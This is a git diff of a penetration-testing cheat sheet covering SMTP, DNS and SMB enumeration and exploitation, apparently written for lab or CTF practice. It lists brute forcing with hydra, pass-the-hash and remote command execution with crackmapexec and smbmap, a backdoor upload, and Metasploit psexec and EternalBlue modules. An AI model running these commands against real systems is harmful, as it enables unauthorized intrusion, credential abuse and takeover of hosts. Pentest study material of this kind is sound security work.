@@ -150,7 +150,6 @@ nc -vn {IP} 23
 #### 25 SMTP
 ```
 nmap -p25,465,587 --script=smtp-commands,smtp-open-relay,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 10.10.10.10 -v
-
 ```
 **Version Info**
 ```
@@ -210,7 +209,7 @@ RCPT TO:root
 ```
 
 **Mail LFI to RCE Exploit**
-[Beep](https://www.youtube.com/watch?v=XJmBpOd__N8&t=963s)
+[Beep HTB](https://www.youtube.com/watch?v=XJmBpOd__N8&t=963s)
 1. Access the SMTP server.
 ```
 telnet [IP] 25
@@ -241,9 +240,39 @@ This is a test message.
 .../var/mail/[user]&rbwn=[command]
 ```
 
+**Helpful Resources**
+[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp)
 ********************************************************************************
 
 #### 53 DNS
+***host**
+```
+host www.megacorpone.com
+host -t mx megacorpone.com
+host -t txt megacorpone.com
+```
+**nslookup**
+```
+nslookup amazon.in
+nslookup -type=MX amazon.in
+```
+**dig**
+```
+dig amazon.in
+dig mx amazon.in
+dig +short mx dtcc.com
+```
+**dnsrecon**
+```
+dnsrecon -d amazon.in
+```
+**Enumerate & Brute Force by dnsenum**
+```
+dnsenum amazon.in
+```
+**DNS Zone Transfer attack**
+
+
 #### 69 TFTP
 
 
@@ -486,127 +515,43 @@ Here’s an example `web.xml` file.
 #### 88 Kerberos
 #### 161 SNMP
 
-#### 445 SAMBA
+#### 139, 445 SMB, SAMBA
+```
+nmap 192.213.18.3 -sV --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 445
+```
+**Enumerate SMB shares**
+```
+# List shares
+smbmap -H 192.120.159.3 
+smbclient -L 192.221.150.3
+smbmap  -H 10.5.26.125 -u administrator -p smbserver_771 -d .
 
-##### Enumeration
+# Enumerate shares recursively
+smbmap -H 192.120.159.3 -R --depth 5
+smbclient --no-pass -c 'recurse;ls' //192.180.12.3/shawn
+smbmap  -H 10.5.26.125 -u administrator -p smbserver_771 -d . -R --depth 5
+smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -r 'C$'
 
-- Samba enumeration (all possible things)
-    - `enum4linux -e 10.10.18.135`
+```
+**Connect to SMB shares**
+```
+# Connect without credentials/Null Session/Anonymous login
+smbclient //192.120.159.3 - N
+smbclient -U '%' //192.120.159.3 - N
+smbclient --no-pass //192.180.12.3/shawn
+rpcclient -U "" -N 192.230.148.3
 
-- Samba version, workgroup name, 
-    - `nmap 192.213.18.3 -sV -p 445`
-    - `nmap --top-port 25 -sU --open 192.213.18.3 -sV`
-    - `use auxiliary/scanner/smb/smb_version`
-- Samba OS discovery, Netbios name,  computer name
-    - `nmap -p 445 192.213.18.3 --script smb-os-discovery`
-    - `rpcclient -U "" -N 192.230.148.3` > `srvinfo`
-    - `enum4linux -O 192.54.223.3 -p 445`
-    - `nmblookup -A 192.221.150.3`
-- Samba Anonymous connection
-    - `smbclient -L 192.221.150.3`
-    - `rpcclient -U "" -N 192.230.148.3`
-- Samba accessing shares by connection
-    - `smbclient //192.120.159.3/public - N`
-    - `smbclient //192.241.81.3/admin -U admin` 
-    - `smbclient //192.180.12.3/shawn -U admin` > `?`
-- Samaba listing users
-    - `nmap --script smb-enum-users --script-args smbusername=admin,smbpassword=password1 192.157.202.3`
-    - `use auxiliary/scanner/smb/smb_enumusers`
-    - `enum4linux -U 192.54.223.3 -p 445`
-    - `rpcclient -U "" -N 192.54.223.3` >`enumdomusers` 
-- Samba finding SID of admin
-    - `rpcclient -U "" -N 192.54.223.3` > `lookupnames admin`
-    - `enum4linux -r -u "admin" -p "password1" 192.241.81.3`
-- Samba finding domain groups
-    - `enum4linux -G  192.120.159.3`
-    - `rpcclient -U "" -N 192.120.159.3` > `enumdomgroups`
-- Samba listing shares and thrier permissions
-    - `nmap --script smb-enum-shares -script-args smbusername=admin,smbpassword=password1 192.54.233.3`
-    - `smbclient -L 192.221.150.3`
-    - `smbmap -u guest -p "" -d .  -H 10.5.26.125`
-    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125`
-    - `enum4linux -S  192.120.159.3`
-    - `use auxiliary/scanner/smb/smb_enumshares`
-- Samba listing content of shared drive
-    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -r 'C$'`
-    - `smbclient //192.120.159.3/public - N` > `ls`
-- Samba uploading file to network share
-    - `smbmap -u administrator -p smbserver_771 --upload '/root/backdoor' 'C$\backdoor' -H 10.5.24.17`
-- Samba downloaing file from network share
-    - `smbmap -u administrator -p smbserver_771 --download 'C$\flag.txt' -H 10.5.24.17`
-- Samba remote code execution
-    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -x 'ipconfig'`
-- Samba pipes available
-    - `use auxiliary/scanner/smb/pipe_auditor`
-- Samba printer configuration
-    - `enum4linux -I  192.120.159.3`
-
-##### Exploitation
-
-- Samba listing users
-    - `nmap --script smb-enum-users --script-args smbusername=admin,smbpassword=password1 192.157.202.3`
-    - `use auxiliary/scanner/smb/smb_enumusers`
-    - `enum4linux -U 192.54.223.3 -p 445`
-    - `rpcclient -U "" -N 192.54.223.3` >`enumdomusers` 
-- Samba accessing shares by connection
-    - `smbclient //192.120.159.3/public - N`
-    - `smbclient //192.241.81.3/admin -U admin` 
-    - `smbclient //192.180.12.3/shawn -U admin` > `?`
-- Samba listing shares and thrier permissions
-    - `nmap --script smb-enum-shares -script-args smbusername=admin,smbpassword=password1 192.54.233.3`
-    - `smbclient -L 192.221.150.3`
-    - `smbmap -u guest -p "" -d .  -H 10.5.26.125`
-    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125`
-    - `enum4linux -S  192.120.159.3`
-    - `use auxiliary/scanner/smb/smb_enumshares`
-- Samba listing content of shared drive
-    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -r 'C$'`
-    - `smbclient //192.120.159.3/public - N` > `ls`
-- Samba uploading file to network share
-    - `smbmap -u administrator -p smbserver_771 --upload '/root/backdoor' 'C$\backdoor' -H 10.5.24.17`
-- Samba downloaing file from network share
-    - `smbmap -u administrator -p smbserver_771 --download 'C$\flag.txt' -H 10.5.24.17`
-- Samba remote code execution
-    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -x 'ipconfig'`
-- Samba pipes available
-    - `use auxiliary/scanner/smb/pipe_auditor`
-- Samba finding SID of admin
-    - `rpcclient -U "" -N 192.54.223.3` > `lookupnames admin`
-    - `enum4linux -r -u "admin" -p "password1" 192.241.81.3`
-- Exploiting Using Metasploit
-    - `use exploit/linux/samba/is_known_pipename `
-
-#### 445 SMB
-
-##### Enumeration
-
-- SMB version
-    - `nmap --script smb-protocols 10.5.16.60 -p 445 `
-- SMB security (user/share level suthentication,message signing, challange response,account lockout, password policy)
-    - `nmap --script smb-security-mode 10.5.16.60 -p 445 `
-    - `nmap --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`
-- SMB active sessions
-    - `nmap --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 10.5.21.157 -p 445`
-- SMB network shares
-    - `nmap -p445 --script smb-enum-shares 10.5.21.157`
-    - `nmap --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`
-- SMB network shares files
-    - `nmap --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.31.241`
-- SMB users
-    - `nmap --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`
-- SMB groups
-    - `nmap --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`
-- SMB statistics (failed logins. errors etc..)
-    - `nmap --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`
-
-##### Exploitation
-
-###### DumpShares
-
-- Dump All Share Accessible recusrively
+# Connect with credentials
+smbclient //192.180.12.3/shawn -U admin
+```
+**Brute Force**
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.241.81.3 smb
+```
+**Get All Files from Share**
 ```
 ┌──(kali㉿kali)-[~]
-└─$ `smbclient //10.10.90.60/Users -U guest `
+└─$ smbclient //10.10.90.60/Users -U guest
 Password for [WORKGROUP\guest]:
 Try "help" to get a list of possible commands.
             
@@ -615,19 +560,46 @@ smb: \> mask ""
 smb: \> prompt OFF
 smb: \> mget *
 ```
-###### RemoteCodeExecution
--
 
-###### KnownExploits
+**Other Enumeration**
+```
+# Enumerate everything possible
+enum4linux -e 10.10.18.135
+enum4linux -r -u "admin" -p "password1" 192.241.81.3
+
+# Enumerate users
+enum4linux -U 192.54.223.3 -p 445
+
+# rpcclient commands
+rpcclient -U "" 10.11.1.111
+	srvinfo
+	enumdomusers
+	getdompwinfo
+	querydominfo
+	netshareenum
+	netshareenumall
+
+
+```
+**RemoteCodeExecution**
+```
+smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -x 'ipconfig'
+crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d -x "ipconfig"
+```
+**Paas The Hash**
+```
+crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d
+```
+**Get Shell**
+```
+# PsExec
+use exploit/windows/smb/psexec
+```
+**KnownExploits**
 - EternalBlue
     - Exploiting `EternalBlue` vulnerabibility in SMBv1
         - `use auxiliary/scanner/smb/smb_ms17_010`
 
-    - Exploiting Security misconsifugration *Message signing enabled but not required* by `PSExec`
-        - First finding credentials by brute forcing
-            - `scanner/smb/smb_login` / `hydra` / any other
-        - Exploiting flaw using metasploit `PsExec` module
-            - `use exploit/windows/smb/psexec` > `set RHOSTS 10.5.22.249` > `set LHOST 10.10.26.2` > `set SMBUSER administrator` > `set SMBPASS qwertyuiop` > `set LPORT 1234` > `exploit`
 
 #### 3389 RDP
 
